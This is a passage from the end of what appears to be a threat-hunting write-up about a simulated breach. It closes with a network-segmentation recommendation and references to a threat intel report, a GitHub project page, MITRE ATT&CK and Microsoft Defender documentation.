6. **Network segmentation** - Limit lateral movement opportunities by segmenting critical systems.

---

## References

- [JADE SPIDER Threat Intel Report](https://www.notion.so/JADE-SPIDER-2b0cf57416ff80f38f39f75f670b09e2)
- [Additional Details - By Threat Hunt Organizor](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-1-port-of-entry/docs/additional-details.md)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender for Endpoint Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
